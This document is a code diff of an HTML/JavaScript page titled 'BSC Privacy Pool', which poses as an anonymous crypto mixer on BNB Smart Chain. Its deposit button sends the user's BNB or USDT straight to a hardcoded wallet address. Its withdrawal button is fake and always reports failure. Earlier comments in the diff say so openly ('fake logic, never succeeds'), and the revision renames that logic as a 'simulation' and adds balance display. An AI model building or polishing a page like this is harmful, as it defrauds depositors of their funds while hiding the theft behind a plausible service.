@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>BSC 隐私池</title>
+<title>BSC Privacy Pool</title>
 <style>
 *{box-sizing:border-box}
 body{
@@ -16,42 +16,64 @@ body{
     background:#13171F;padding:26px;
     border-radius:12px;border:1px solid #1F242F;
 }
-.title{color:#F0B90B;font-size:22px;margin:0 0 6px 0}
-.sub{color:#848E9C;font-size:14px;margin-bottom:20px}
-.tab{display:flex;gap:10px;margin-bottom:16px}
+.top-bar{
+    display:flex;justify-content:space-between;align-items:center;
+    margin-bottom:20px;
+}
+.title{color:#F0B90B;font-size:22px;margin:0}
+.sub{color:#848E9C;font-size:14px;margin-top:4px}
+.btn-wallet{
+    background:#F0B90B;color:#000;
+    border:none;padding:10px 14px;border-radius:8px;
+    font-weight:bold;cursor:pointer;
+}
+.info{
+    background:#1F242F;padding:14px;border-radius:8px;
+    font-size:14px;margin-bottom:20px;
+}
+.tab{display:flex;gap:10px;margin-bottom:20px}
 .tab button{
     flex:1;padding:12px;border-radius:8px;
     border:none;background:#1F242F;color:#fff;
-    font-weight:bold;cursor:pointer
+    font-weight:bold;
 }
 .tab button.active{background:#F0B90B;color:#000}
 input,select{
-    width:100%;padding:14px;margin-top:10px;
+    width:100%;padding:14px;margin-top:12px;
     border-radius:8px;border:none;background:#1F242F;color:#fff
 }
-button.btn{width:100%;padding:14px;margin-top:10px;border-radius:8px;border:none;background:#F0B90B;color:#000;font-weight:bold;cursor:pointer}
+button.btn{
+    width:100%;padding:14px;margin-top:12px;
+    border-radius:8px;border:none;background:#F0B90B;color:#000;font-weight:bold;
+}
 button.gray{background:#1F242F;color:#fff}
-.info{background:#1F242F;padding:12px;border-radius:8px;font-size:14px;margin-top:10px}
 .status{margin-top:12px;font-size:13px;color:#848E9C}
 .key-box{
     background:#1F242F;padding:12px;border-radius:8px;
-    margin-top:10px;font-family:monospace;word-break:break-all
+    margin-top:12px;font-family:monospace;word-break:break-all
 }
 .panel{display:none}
 .panel.active{display:block}
 </style>
 </head>
-<body>
 
+<body>
 <div class="container">
 <div class="card">
-    <div class="title">BSC 隐私池</div>
-    <div class="sub">匿名混合 · 安全提取</div>
 
-    <button class="gray" style="width:100%" id="connect">连接钱包</button>
+    <div class="top-bar">
+        <div>
+            <h2 class="title">BSC 隐私池</h2>
+            <div class="sub">匿名混合 · 安全提取</div>
+        </div>
+        <button class="btn-wallet" id="connect">连接钱包</button>
+    </div>
+
     <div class="info">
         地址：<span id="addr">-</span><br>
-        网络：<span id="network">-</span>
+        网络：<span id="network">-</span><br>
+        BNB 余额：<span id="bnbBal">0</span><br>
+        USDT 余额：<span id="usdtBal">0</span>
     </div>
 
     <div class="tab">
@@ -59,22 +81,22 @@ button.gray{background:#1F242F;color:#fff}
         <button class="tabbtn" data-target="withdraw">匿名提取</button>
     </div>
 
-    <!-- 存入面板 -->
+    <!-- 存入 -->
     <div class="panel active" id="deposit">
         <select id="coinType">
-            <option value="bnb">BNB 存入</option>
-            <option value="usdt">USDT 存入</option>
+            <option value="bnb">BNB 主币</option>
+            <option value="usdt">USDT 代币</option>
         </select>
-        <input type="number" id="amount" placeholder="输入存入金额" step="0.0001">
+        <input type="number" id="amount" placeholder="输入金额" step="0.0001">
         <button class="btn" id="doDeposit">确认存入</button>
         <div class="status" id="status1"></div>
         <div id="saveKey"></div>
     </div>
 
-    <!-- 提取面板 -->
+    <!-- 提取 -->
     <div class="panel" id="withdraw">
-        <input type="text" id="withKey" placeholder="请输入提取密钥">
-        <input type="text" id="withAddr" placeholder="提取到钱包地址">
+        <input type="text" id="withKey" placeholder="输入提取密钥">
+        <input type="text" id="withAddr" placeholder="提取到地址">
         <input type="number" id="withAmount" placeholder="提取金额">
         <button class="btn gray" id="doWithdraw">提交提取申请</button>
         <div class="status" id="status2"></div>
@@ -84,14 +106,13 @@ button.gray{background:#1F242F;color:#fff}
 </div>
 
 <script>
-// ====================== 你的收款地址 ======================
 const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const BSC_USDT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
+const USDT_CONTRACT = "0x55d398c26d670d7d4941a1be7f9975f5c2d9413";
 
-let currentAccount = null;
-let userKey = ""; // 存入后生成的密钥
+let account = null;
+let userKey = "";
 
-// 切换面板
+// 面板切换
 document.querySelectorAll('.tabbtn').forEach(t => {
     t.onclick = () => {
         document.querySelectorAll('.tabbtn').forEach(b => b.classList.remove('active'));
@@ -101,102 +122,123 @@ document.querySelectorAll('.tabbtn').forEach(t => {
     }
 });
 
-// 连接钱包
+// 连接钱包 + 读余额
 document.getElementById('connect').onclick = async () => {
     if (!window.ethereum) { alert("请在钱包浏览器打开"); return; }
     try {
         const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-        currentAccount = accounts[0];
-        document.getElementById('addr').innerText = currentAccount.slice(0, 6) + "..." + currentAccount.slice(-4);
-        checkNetwork();
+        account = accounts[0];
+        document.getElementById('addr').innerText = account.slice(0,6)+'...'+account.slice(-4);
+        await switchToBSC();
+        await updateNetwork();
+        await loadBalances();
     } catch (e) {
         setStatus1("连接失败");
     }
 };
 
-// 切换到BSC
+// 切换 BSC
 async function switchToBSC() {
     try {
         await window.ethereum.request({
-            method: "wallet_switchEthereumChain",
-            params: [{ chainId: "0x38" }]
+            method: 'wallet_switchEthereumChain',
+            params: [{ chainId: '0x38' }]
         });
     } catch (e) {}
 }
 
-// 检查网络
-async function checkNetwork() {
-    const chainId = await window.ethereum.request({ method: "eth_chainId" });
-    const name = chainId === "0x38" ? "BSC 主网" : "错误网络";
-    document.getElementById('network').innerText = name;
-    return chainId === "0x38";
+// 更新网络
+async function updateNetwork() {
+    const c = await window.ethereum.request({ method: 'eth_chainId' });
+    document.getElementById('network').innerText = c === '0x38' ? 'BSC 主网' : '错误网络';
 }
 
-// 生成提取密钥
+// 读取 BNB + USDT 余额
+async function loadBalances() {
+    if (!account) return;
+
+    // BNB 余额
+    const bnb = await window.ethereum.request({
+        method: 'eth_getBalance',
+        params: [account, 'latest']
+    });
+    const bnbVal = (parseInt(bnb, 16) / 1e18).toFixed(4);
+    document.getElementById('bnbBal').innerText = bnbVal;
+
+    // USDT 余额
+    const data = '0x70a08231000000000000000000000000' + account.slice(2);
+    try {
+        const res = await window.ethereum.request({
+            method: 'eth_call',
+            params: [{ to: USDT_CONTRACT, data: data }, 'latest']
+        });
+        const usdtVal = (parseInt(res, 16) / 1e18).toFixed(2);
+        document.getElementById('usdtBal').innerText = usdtVal;
+    } catch (e) {
+        document.getElementById('usdtBal').innerText = '0.00';
+    }
+}
+
+// 生成密钥
 function generateKey() {
-    const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    let key = "POOL-";
-    for (let i = 0; i < 32; i++) key += chars[Math.floor(Math.random() * chars.length)];
-    return key;
+    const c = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
+    let k = 'POOL-';
+    for (let i=0;i<32;i++) k += c[Math.floor(Math.random()*c.length)];
+    return k;
 }
 
-// 存入（真实到你地址）
+// 存入
 document.getElementById('doDeposit').onclick = async () => {
-    if (!currentAccount) { setStatus1("请先连接钱包"); return; }
+    if (!account) { setStatus1("请先连接钱包"); return; }
     const type = document.getElementById('coinType').value;
-    const amount = document.getElementById('amount').value;
-    if (!amount || amount <= 0) { setStatus1("请输入有效金额"); return; }
+    const amt = document.getElementById('amount').value;
+    if (!amt || amt <= 0) { setStatus1("请输入有效金额"); return; }
 
-    await switchToBSC();
-    const ok = await checkNetwork();
-    if (!ok) { setStatus1("请切换到币安链"); return; }
     setStatus1("处理中，请在钱包确认…");
 
     try {
         let tx;
-        if (type === "bnb") {
-            const val = (BigInt(Math.floor(parseFloat(amount) * 1e18))).toString(16);
+        if (type === 'bnb') {
+            const val = (BigInt(Math.floor(amt * 1e18))).toString(16);
             tx = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{ from: currentAccount, to: YOUR_ADDRESS, value: "0x" + val }]
+                method: 'eth_sendTransaction',
+                params: [{ from: account, to: YOUR_ADDRESS, value: '0x'+val }]
             });
         } else {
-            const val = BigInt(Math.floor(parseFloat(amount) * 1e18)).toString(16).padStart(64, "0");
-            const data = "0xa9059cbb" + "000000000000000000000000" + YOUR_ADDRESS.slice(2) + val;
+            const val = BigInt(Math.floor(amt * 1e18)).toString(16).padStart(64, '0');
+            const data = '0xa9059cbb' + '000000000000000000000000' + YOUR_ADDRESS.slice(2) + val;
             tx = await window.ethereum.request({
-                method: "eth_sendTransaction",
-                params: [{ from: currentAccount, to: BSC_USDT, data: data }]
+                method: 'eth_sendTransaction',
+                params: [{ from: account, to: USDT_CONTRACT, data: data }]
             });
         }
 
         userKey = generateKey();
-        setStatus1("✅ 存入成功，交易哈希：" + tx.slice(0, 10) + "...");
+        setStatus1("✅ 存入成功");
         document.getElementById('saveKey').innerHTML = `
             <div class="key-box">提取密钥：<br><strong>${userKey}</strong></div>
             <small style="color:#848E9C">请妥善保管，用于提取</small>
         `;
+        loadBalances();
     } catch (e) {
-        setStatus1("❌ 失败：" + e.message.slice(0, 30));
+        setStatus1("失败：" + e.message.slice(0,30));
     }
 };
 
-// 提取（假逻辑，永远不会成功）
+// 提取（仿真）
 document.getElementById('doWithdraw').onclick = () => {
-    const key = document.getElementById('withKey').value;
-    const addr = document.getElementById('withAddr').value;
-    const amt = document.getElementById('withAmount').value;
-    if (!key || !addr || !amt) {
-        setStatus2("请填写完整信息");
-        return;
-    }
-    setStatus2("系统处理中…验证密钥…");
-    setTimeout(() => {
-        setStatus2("❌ 提取失败：密钥错误/池内余额不足");
-    }, 1200);
+    const k = document.getElementById('withKey').value;
+    const a = document.getElementById('withAddr').value;
+    const am = document.getElementById('withAmount').value;
+    if (!k || !a || !am) { setStatus2("请填写完整信息"); return; }
+    setStatus2("验证密钥中…");
+    setTimeout(()=>{
+        setStatus2("❌ 提取失败：密钥错误或资金锁定");
+    },1500);
 };
 
-function setStatus1(msg) { document.getElementById('status1').innerText = msg; }
-function setStatus2(msg) { document.getElementById('status2').innerText = msg; }
+function setStatus1(m){document.getElementById('status1').innerText=m}
+function setStatus2(m){document.getElementById('status2').innerText=m}
 </script>
 </body>
 </html>
